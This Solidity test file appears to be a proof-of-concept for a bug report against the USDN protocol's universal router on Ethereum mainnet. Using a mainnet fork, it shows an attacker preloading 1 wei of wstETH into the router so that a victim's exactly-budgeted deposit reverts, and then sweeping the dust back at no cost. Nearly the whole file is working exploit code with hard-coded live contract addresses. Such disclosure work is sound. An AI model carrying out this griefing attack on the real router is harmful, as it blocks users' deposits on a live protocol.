// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;

import { Test } from "forge-std/Test.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { Constants } from "@uniswap/universal-router/contracts/libraries/Constants.sol";
import { IUsdnProtocol } from "usdn-contracts/src/interfaces/UsdnProtocol/IUsdnProtocol.sol";
import { IUsdnProtocolTypes } from "usdn-contracts/src/interfaces/UsdnProtocol/IUsdnProtocolTypes.sol";

import { IUniversalRouter } from "../src/interfaces/IUniversalRouter.sol";
import { Commands } from "../src/libraries/Commands.sol";
import { IUsdnProtocolRouterTypes } from "../src/interfaces/usdn/IUsdnProtocolRouterTypes.sol";
import { IPaymentLibTypes } from "../src/interfaces/usdn/IPaymentLibTypes.sol";

/// @dev Minimal model of the official deposit route immediately before INITIATE_DEPOSIT:
/// the intended wstETH amount and exactly-quoted SDEX are produced in the same transaction,
/// then the Router uses CONTRACT_BALANCE and finally sweeps leftovers back.
contract VictimDepositWorkflow {
    IUniversalRouter public immutable ROUTER;
    IERC20 public immutable ASSET;
    IERC20 public immutable SDEX;

    constructor(IUniversalRouter router, IERC20 asset, IERC20 sdex) {
        ROUTER = router;
        ASSET = asset;
        SDEX = sdex;
    }

    function run(uint256 intendedAssetAmount, uint256 exactSdexBudget, uint256 securityDeposit) external {
        require(ASSET.transfer(address(ROUTER), intendedAssetAmount), "asset transfer");
        require(SDEX.transfer(address(ROUTER), exactSdexBudget), "sdex transfer");

        bytes[] memory priceData = new bytes[](0);
        uint128[] memory rawIndices = new uint128[](0);
        IUsdnProtocolTypes.PreviousActionsData memory previousActions =
            IUsdnProtocolTypes.PreviousActionsData({ priceData: priceData, rawIndices: rawIndices });

        IUsdnProtocolRouterTypes.InitiateDepositData memory deposit = IUsdnProtocolRouterTypes.InitiateDepositData({
            payment: IPaymentLibTypes.PaymentType.Transfer,
            amount: Constants.CONTRACT_BALANCE,
            sharesOutMin: 0,
            to: address(this),
            validator: address(this),
            deadline: type(uint256).max,
            currentPriceData: "",
            previousActionsData: previousActions,
            ethAmount: securityDeposit
        });

        bytes memory commands = abi.encodePacked(
            uint8(Commands.INITIATE_DEPOSIT),
            uint8(Commands.SWEEP),
            uint8(Commands.SWEEP)
        );
        bytes[] memory inputs = new bytes[](3);
        inputs[0] = abi.encode(deposit);
        inputs[1] = abi.encode(address(ASSET), address(this), 0, 0);
        inputs[2] = abi.encode(address(SDEX), address(this), 0, 0);

        ROUTER.execute{ value: securityDeposit }(commands, inputs);
    }

    receive() external payable { }
}

contract TestRouterMainnetPreloadGriefPoC is Test {
    address internal constant ROUTER_ADDR = 0x49f66B1616865b2a59caECb8352bbf2AC80983e1;
    address internal constant PROTOCOL_ADDR = 0x656cB8C6d154Aad29d8771384089be5B5141f01a;
    address internal constant ATTACKER = address(0xB0B);
    uint256 internal constant INTENDED_DEPOSIT = 0.1 ether;

    IUniversalRouter internal router;
    IUsdnProtocol internal protocol;
    IERC20 internal asset;
    IERC20 internal sdex;
    VictimDepositWorkflow internal victim;
    uint256 internal securityDeposit;
    uint256 internal exactSdexBudget;

    function setUp() public {
        string memory rpc = vm.envString("MAINNET_RPC_URL");
        vm.createSelectFork(rpc);

        router = IUniversalRouter(ROUTER_ADDR);
        protocol = IUsdnProtocol(PROTOCOL_ADDR);
        asset = IERC20(address(protocol.getAsset()));
        sdex = IERC20(address(protocol.getSdex()));
        victim = new VictimDepositWorkflow(router, asset, sdex);

        securityDeposit = protocol.getSecurityDepositValue();
        uint128 lastPrice = protocol.getLastPrice();
        uint128 lastTimestamp = protocol.getLastUpdateTimestamp();
        (, exactSdexBudget) = protocol.previewDeposit(INTENDED_DEPOSIT, lastPrice, lastTimestamp);

        // Isolate Router custody from any unrelated historical dust at the selected fork block.
        deal(address(asset), ROUTER_ADDR, 0);
        deal(address(sdex), ROUTER_ADDR, 0);

        deal(address(asset), address(victim), INTENDED_DEPOSIT);
        deal(address(sdex), address(victim), exactSdexBudget);
        vm.deal(address(victim), securityDeposit);
        vm.deal(ATTACKER, 1 ether);

        emit log_named_uint("fork block", block.number);
        emit log_named_address("asset", address(asset));
        emit log_named_address("sdex", address(sdex));
        emit log_named_uint("security deposit", securityDeposit);
        emit log_named_uint("exact SDEX budget", exactSdexBudget);
    }

    function test_control_exactOfficialBudgetSucceedsWithoutPreload() public {
        victim.run(INTENDED_DEPOSIT, exactSdexBudget, securityDeposit);

        // The normal workflow is viable with exactly the quoted SDEX budget.
        assertEq(asset.balanceOf(ROUTER_ADDR), 0, "normal route leaves no asset dust");
        assertEq(sdex.balanceOf(ROUTER_ADDR), 0, "normal route leaves no SDEX dust");

        IUsdnProtocolTypes.PendingAction memory pending = protocol.getUserPendingAction(address(victim));
        assertEq(
            uint256(pending.action),
            uint256(IUsdnProtocolTypes.ProtocolAction.ValidateDeposit),
            "deposit was initiated"
        );
    }

    function test_oneWeiPreloadRevertsOfficialRouteAndAttackerRecoversDust() public {
        // Separate attacker transaction before the victim. The transfer is permissionless and costs 1 wei wstETH.
        deal(address(asset), ATTACKER, 1);
        vm.prank(ATTACKER);
        require(asset.transfer(ROUTER_ADDR, 1), "preload");
        assertEq(asset.balanceOf(ROUTER_ADDR), 1, "attacker dust preloaded");

        uint256 victimAssetBefore = asset.balanceOf(address(victim));
        uint256 victimSdexBefore = sdex.balanceOf(address(victim));

        // CONTRACT_BALANCE makes the protocol see INTENDED_DEPOSIT + 1 wei.
        // Current mainnet preview requires 119 extra wei SDEX for that one extra wei wstETH,
        // but the official exact-output workflow budgeted SDEX for INTENDED_DEPOSIT only.
        vm.expectRevert();
        victim.run(INTENDED_DEPOSIT, exactSdexBudget, securityDeposit);

        // All victim-side transfers were in the reverted transaction; only the attacker's prior 1 wei remains.
        assertEq(asset.balanceOf(address(victim)), victimAssetBefore, "victim asset transfer reverted");
        assertEq(sdex.balanceOf(address(victim)), victimSdexBefore, "victim SDEX transfer reverted");
        assertEq(asset.balanceOf(ROUTER_ADDR), 1, "only attacker preload survives victim revert");
        assertEq(sdex.balanceOf(ROUTER_ADDR), 0, "victim SDEX does not remain in router");

        // Separate attacker transaction recovers the full preload, so the attack consumes no wstETH principal.
        bytes memory commands = abi.encodePacked(uint8(Commands.SWEEP));
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encode(address(asset), ATTACKER, 0, 0);
        vm.prank(ATTACKER);
        router.execute(commands, inputs);

        assertEq(asset.balanceOf(ATTACKER), 1, "attacker recovered 1 wei preload");
        assertEq(asset.balanceOf(ROUTER_ADDR), 0, "router dust recovered");
    }
}
